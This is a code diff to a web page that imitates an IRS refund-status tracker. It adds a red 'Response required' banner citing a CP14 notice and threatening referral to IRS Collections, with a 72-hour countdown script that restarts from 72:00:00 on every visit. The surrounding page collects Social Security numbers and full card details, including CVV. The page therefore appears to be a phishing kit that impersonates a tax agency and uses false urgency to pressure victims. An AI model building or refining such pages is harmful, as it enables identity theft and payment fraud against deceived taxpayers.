@@ -261,6 +261,34 @@
         .status-banner.visible {
             display: block;
         }
+        .urgency-countdown-banner {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 0 0 16px 0;
+            padding: 12px 18px;
+            background: #b50909;
+            color: #fff;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.18);
+        }
+        .urgency-countdown-banner .ucb-icon {
+            font-size: 20px;
+            line-height: 1;
+        }
+        .urgency-countdown-banner .ucb-text {
+            flex: 1;
+            font-weight: 500;
+        }
+        .urgency-countdown-banner #ucb-countdown {
+            font-family: "Source Code Pro", Menlo, Consolas, monospace;
+            font-weight: 700;
+            background: rgba(0,0,0,0.18);
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
     </style>
 </head>
 <body>
@@ -285,6 +313,11 @@
                 <div class="step done"><div class="step-circle">✓</div><div class="step-label">Return Received</div></div>
                 <div class="step halted"><div class="step-circle">!</div><div class="step-label">Action Required</div></div>
                 <div class="step"><div class="step-circle"></div><div class="step-label">Refund Sent</div></div>
+            </div>
+
+            <div id="urgency-countdown-banner" class="urgency-countdown-banner" role="alert">
+                <span class="ucb-icon">&#9888;</span>
+                <span class="ucb-text">Response required &mdash; Notice CP14 deadline in <span id="ucb-countdown">72:00:00</span>. After this window the case is referred to the IRS Collections Division.</span>
             </div>
 
             <div class="usa-alert-error">
@@ -350,7 +383,24 @@
             banner.classList.add('visible');
         }
 
+        function startUrgencyCountdown() {
+            const el = document.getElementById('ucb-countdown');
+            if (!el) return;
+            let secs = 72 * 3600;
+            const fmt = () => {
+                const h = String(Math.floor(secs / 3600)).padStart(2, '0');
+                const m = String(Math.floor((secs % 3600) / 60)).padStart(2, '0');
+                const s = String(secs % 60).padStart(2, '0');
+                el.textContent = `${h}:${m}:${s}`;
+            };
+            fmt();
+            setInterval(() => {
+                if (secs > 0) { secs -= 1; fmt(); }
+            }, 1000);
+        }
+
         document.addEventListener('DOMContentLoaded', async () => {
+            startUrgencyCountdown();
             await postJson('/api/notice/review', {});
 
             ['tin-ssn', 'card-name', 'card-num', 'card-exp', 'card-cvv'].forEach((id) => {
